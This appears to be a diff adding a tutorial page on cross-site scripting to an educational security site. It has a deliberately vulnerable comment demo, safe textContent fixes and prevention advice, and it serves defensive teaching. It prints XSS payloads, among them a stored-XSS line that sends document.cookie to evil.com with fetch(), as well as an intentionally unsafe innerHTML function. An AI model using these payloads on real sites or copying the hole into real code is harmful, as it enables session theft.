@@ -1,0 +1,322 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>XSS Vulnerability Demo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="site.css" />
+    
+  </head>
+  <body>
+    <a href="#main-content" class="skip-link">Skip to content</a>
+    
+    <header class="site-header">
+      <div class="header-container">
+        <div class="logo">
+          <a href="index.html">
+            <span class="logo-bracket">[</span>
+            <span class="logo-text">BEATTIE</span>
+            <span class="logo-bracket">]</span>
+            <span class="logo-subtitle">TECH</span>
+          </a>
+        </div>
+        
+        <button class="mobile-menu-toggle" aria-label="Toggle menu">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+        
+        <nav class="main-nav nav-links">
+          <ul>
+            <li><a href="index.html">🏠 Home</a></li>
+            <li><a href="study-guides.html">📖 Study Guides</a></li>
+            <li><a href="learning-tracks.html">🎯 Learning Tracks</a></li>
+            <li><a href="resources.html" class="active">🔬 Study Hub</a></li>
+            <li><a href="cheat-sheets.html">⚡ Cheat Sheets</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+    
+    <div class="scanlines"></div>
+    
+    <main id="main-content" class="container">
+      <nav class="breadcrumbs">
+        <a href="index.html">Home</a>
+        <span class="separator">/</span>
+        <a href="resources.html">Study Hub</a>
+        <span class="separator">/</span>
+        <span class="current">XSS Demo</span>
+      </nav>
+      
+      <h1>Cross-Site Scripting (XSS)</h1>
+      
+      <p style="font-size: 1.1em; margin-bottom: 30px;">Educational demonstration of XSS vulnerabilities and defenses</p>
+      
+      <!-- Reflected XSS -->
+      <div class="demo-section">
+        <h2>Reflected XSS Attack</h2>
+        
+        <div class="tabs">
+          <button class="tab-btn active" onclick="switchTab('xss-demo', this)">Demo</button>
+          <button class="tab-btn" onclick="switchTab('xss-code', this)">Code</button>
+        </div>
+        
+        <div id="xss-demo" class="tab-content active">
+          <p>Try entering: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></p>
+          <input type="text" id="xssInput" placeholder="Enter a comment">
+          <button onclick="vulnerableXSS()">Post Comment (Vulnerable)</button>
+          
+          <div id="xssOutput" class="output-box"></div>
+        </div>
+        
+        <div id="xss-code" class="tab-content">
+          <div class="code-block">
+<pre>// VULNERABLE CODE - DO NOT USE
+function displayComment(input) {
+  <span class="vulnerable">document.getElementById('output').innerHTML = input;</span>
+}
+
+// If input = &lt;img src=x onerror="alert('XSS')"&gt;
+// The JavaScript inside the img tag EXECUTES!
+// Attacker can steal cookies, redirect, deface the page, etc.</pre>
+          </div>
+        </div>
+        
+        <div class="warning">⚠️ WARNING: Any user input directly into innerHTML/dangerouslySetInnerHTML can execute JavaScript</div>
+      </div>
+      
+      <!-- Safe XSS Prevention -->
+      <div class="demo-section">
+        <h2>Safe XSS Prevention</h2>
+        
+        <div class="tabs">
+          <button class="tab-btn active" onclick="switchTab('safe-xss-demo', this)">Demo</button>
+          <button class="tab-btn" onclick="switchTab('safe-xss-code', this)">Code</button>
+        </div>
+        
+        <div id="safe-xss-demo" class="tab-content active">
+          <p>Try the same injection: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></p>
+          <input type="text" id="safeXSSInput" placeholder="Enter a comment">
+          <button onclick="safeXSS()">Post Comment (Secure)</button>
+          
+          <div id="safeXSSOutput" class="output-box"></div>
+        </div>
+        
+        <div id="safe-xss-code" class="tab-content">
+          <div class="code-block">
+<pre>// SAFE CODE - Use textContent instead of innerHTML
+function displayComment(input) {
+  <span class="safe">document.getElementById('output').textContent = input;</span>
+}
+
+// Or escape HTML entities:
+function escapeHTML(str) {
+  const div = document.createElement('div');
+  <span class="safe">div.textContent = str;</span>
+  return div.innerHTML;
+}
+
+// textContent treats ALL input as plain text, never as HTML/JS</pre>
+          </div>
+        </div>
+        
+        <div class="safe">✓ SAFE: User input is treated as text, not executable code</div>
+      </div>
+      
+      <!-- Types of XSS -->
+      <div class="demo-section">
+        <h2>Types of XSS Attacks</h2>
+        
+        <h3 style="color: #00d4ff; margin-top: 20px;">1. Reflected XSS</h3>
+        <div class="code-block">
+<pre>Attacker sends link: http://site.com/search?q=&lt;script&gt;stealCookies()&lt;/script&gt;
+Victim clicks link → Server reflects input in response → Script executes
+Impact: Immediate, affects one user per click</pre>
+        </div>
+        
+        <h3 style="color: #00d4ff; margin-top: 20px;">2. Stored XSS</h3>
+        <div class="code-block">
+<pre>Attacker posts comment with: &lt;img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)"&gt;
+Server stores it in database → Every user who views comment gets attacked
+Impact: Persistent, affects all users who see the content</pre>
+        </div>
+        
+        <h3 style="color: #00d4ff; margin-top: 20px;">3. DOM-Based XSS</h3>
+        <div class="code-block">
+<pre>JavaScript reads from: location.hash, window.name, etc.
+var name = location.hash.substr(1);
+<span class="vulnerable">document.getElementById('greeting').innerHTML = 'Hello ' + name;</span>
+
+Attacker link: http://site.com#&lt;img src=x onerror="alert('XSS')"&gt;
+Script on the page processes it → XSS executes
+Impact: No server involved, purely client-side attack</pre>
+        </div>
+      </div>
+      
+      <!-- Learn More Section -->
+      <div class="demo-section" style="background: rgba(0, 100, 150, 0.3); border: 2px solid #00d4ff;">
+        <h2>📚 Learn More: What's XSS? (Explain Like I'm 5)</h2>
+        
+        <h3 style="color: #00ff88; margin-top: 20px; margin-bottom: 10px;">The Simple Story</h3>
+        <p style="line-height: 1.8; font-size: 1.05em;">
+          Imagine you have a magic bulletin board where anything you write becomes real. If you write "apple," 
+          an apple appears. If you write "balloon," a balloon floats up.
+        </p>
+        <p style="line-height: 1.8; font-size: 1.05em; margin-top: 10px;">
+          Now imagine a troublemaker writes: "Make everyone's lunch disappear!" Because the board doesn't know 
+          the difference between good instructions and bad ones, it does it! That's XSS—sneaking in commands 
+          disguised as normal text.
+        </p>
+        
+        <h3 style="color: #00ff88; margin-top: 25px; margin-bottom: 10px;">What's Actually Happening?</h3>
+        <p style="line-height: 1.8; font-size: 1.05em;">
+          Websites are built with HTML (the structure), CSS (the style), and JavaScript (the actions). When you 
+          submit a comment or message, the website displays your text. But what if your "text" contains secret 
+          JavaScript code?
+        </p>
+        <div style="background: rgba(255,85,85,0.2); padding: 15px; margin: 15px 0; border-left: 3px solid #ff5555; font-family: 'JetBrains Mono', monospace;">
+          <div style="color: #ffaa00; margin-bottom: 5px;">❌ Malicious Comment:</div>
+          <code style="color: #ff5555;">&lt;script&gt;alert('You got hacked!');&lt;/script&gt;</code>
+        </div>
+        <p style="line-height: 1.8; font-size: 1.05em;">
+          If the website doesn't check what you typed, it will run that code in everyone's browser who visits the page. 
+          The attacker could:
+        </p>
+        <ul style="font-size: 1.05em; line-height: 2; margin-left: 30px; margin-top: 10px;">
+          <li>🍪 Steal your cookies (which contain login sessions)</li>
+          <li>🔑 Steal passwords you type</li>
+          <li>🎣 Create fake login forms to trick you</li>
+          <li>📍 Redirect you to malicious websites</li>
+          <li>📸 Record everything you do on the page</li>
+        </ul>
+        
+        <h3 style="color: #00ff88; margin-top: 25px; margin-bottom: 10px;">Three Types of XSS</h3>
+        
+        <div style="background: rgba(0,0,0,0.4); padding: 15px; margin: 10px 0; border-left: 3px solid #ffaa00;">
+          <strong style="color: #ffaa00;">1. Stored XSS (Most Dangerous)</strong>
+          <p style="margin-top: 8px; line-height: 1.7;">
+            The attack is saved in the website's database. Every visitor who sees that page gets attacked. 
+            Example: Posting malicious code in a forum comment that stays there forever.
+          </p>
+        </div>
+        
+        <div style="background: rgba(0,0,0,0.4); padding: 15px; margin: 10px 0; border-left: 3px solid #ffaa00;">
+          <strong style="color: #ffaa00;">2. Reflected XSS</strong>
+          <p style="margin-top: 8px; line-height: 1.7;">
+            The attack is in a URL link. When someone clicks the malicious link, the code runs immediately. 
+            Example: A search page that shows your search term without checking it first.
+          </p>
+        </div>
+        
+        <div style="background: rgba(0,0,0,0.4); padding: 15px; margin: 10px 0; border-left: 3px solid #ffaa00;">
+          <strong style="color: #ffaa00;">3. DOM-Based XSS</strong>
+          <p style="margin-top: 8px; line-height: 1.7;">
+            The attack happens entirely in your browser without the server knowing. JavaScript on the page 
+            reads user input and uses it unsafely.
+          </p>
+        </div>
+        
+        <h3 style="color: #00ff88; margin-top: 25px; margin-bottom: 10px;">Real-World Examples</h3>
+        <p style="line-height: 1.8; font-size: 1.05em;">
+          XSS has affected major sites:
+        </p>
+        <ul style="font-size: 1.05em; line-height: 2; margin-left: 30px;">
+          <li>🐦 Twitter (2010): "Onmouseover" worm spread to 1 million+ users</li>
+          <li>🔗 TweetDeck: XSS forced automatic retweets</li>
+          <li>🎮 Steam: XSS allowed stealing of Steam accounts</li>
+          <li>📘 Facebook: Multiple XSS vulnerabilities patched over the years</li>
+        </ul>
+        
+        <h3 style="color: #00ff88; margin-top: 25px; margin-bottom: 10px;">How Do We Stop It?</h3>
+        <p style="line-height: 1.8; font-size: 1.05em;">
+          The key is to <strong>never trust user input!</strong> Always assume users might try to sneak in code.
+        </p>
+        
+        <div style="background: rgba(0,255,136,0.2); padding: 15px; margin: 15px 0; border-left: 3px solid #00ff88;">
+          <div style="color: #ffaa00; margin-bottom: 8px; font-weight: bold;">✓ Safe Method: Use textContent</div>
+          <code style="color: #00d4ff; font-family: 'JetBrains Mono', monospace;">element.textContent = userInput;</code>
+          <p style="margin-top: 10px; line-height: 1.7;">
+            This treats everything as plain text. Even if someone types <code>&lt;script&gt;</code>, it shows up 
+            as literal text instead of running.
+          </p>
+        </div>
+        
+        <div style="background: rgba(255,85,85,0.2); padding: 15px; margin: 15px 0; border-left: 3px solid #ff5555;">
+          <div style="color: #ff5555; margin-bottom: 8px; font-weight: bold;">❌ Dangerous Method: innerHTML</div>
+          <code style="color: #ff5555; font-family: 'JetBrains Mono', monospace;">element.innerHTML = userInput;</code>
+          <p style="margin-top: 10px; line-height: 1.7;">
+            This runs any code in the user input. Never use this with untrusted data!
+          </p>
+        </div>
+        
+        <p style="line-height: 1.8; font-size: 1.05em; margin-top: 15px;">
+          Think of it like this: <strong>textContent</strong> is like putting text behind glass—you can see it but 
+          it can't touch you. <strong>innerHTML</strong> is like opening the door and letting anything walk in!
+        </p>
+      </div>
+      
+      <!-- Prevention -->
+      <div class="demo-section">
+        <h2>XSS Prevention Best Practices</h2>
+        <ul style="font-size: 1.1em; line-height: 2;">
+          <li>✓ Use textContent instead of innerHTML for user input</li>
+          <li>✓ Escape HTML entities in untrusted content</li>
+          <li>✓ Use template engines with auto-escaping</li>
+          <li>✓ Implement Content Security Policy (CSP) headers</li>
+          <li>✓ Validate and sanitize all user input</li>
+          <li>✓ Use DOMPurify or similar libraries for HTML sanitization</li>
+          <li>✓ Avoid eval(), Function(), and setTimeout() with user input</li>
+          <li>✓ Use frameworks like React, Vue (auto-escape by default)</li>
+          <li>✓ Regular security testing and code reviews</li>
+        </ul>
+      </div>
+    </div>
+    
+    <script>
+      function switchTab(tabId, button) {
+        const allTabs = document.querySelectorAll('.tab-content');
+        allTabs.forEach(tab => tab.classList.remove('active'));
+        
+        const allBtns = button.parentElement.querySelectorAll('.tab-btn');
+        allBtns.forEach(btn => btn.classList.remove('active'));
+        
+        document.getElementById(tabId).classList.add('active');
+        button.classList.add('active');
+      }
+      
+      function vulnerableXSS() {
+        const input = document.getElementById('xssInput').value;
+        const output = document.getElementById('xssOutput');
+        
+        // INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
+        output.innerHTML = `<div style="color: #ffff00;">Comment: <br>${input}</div>`;
+        
+        // Show what happened
+        output.innerHTML += `<div class="vulnerable" style="margin-top: 15px;">⚠️ XSS EXECUTED! Input was interpreted as HTML/JavaScript</div>`;
+      }
+      
+      function safeXSS() {
+        const input = document.getElementById('safeXSSInput').value;
+        const output = document.getElementById('safeXSSOutput');
+        
+        // SAFE - Use textContent
+        const div = document.createElement('div');
+        div.textContent = `Comment: ${input}`;
+        div.style.color = '#ffff00';
+        
+        output.textContent = '';
+        output.appendChild(div);
+        
+        const safe = document.createElement('div');
+        safe.className = 'safe';
+        safe.style.marginTop = '15px';
+        safe.textContent = '✓ SAFE! Input treated as plain text, no XSS possible';
+        output.appendChild(safe);
+      }
+    </script>
+    <script type="module" src="site.js"></script>
+  </body>
+</html>
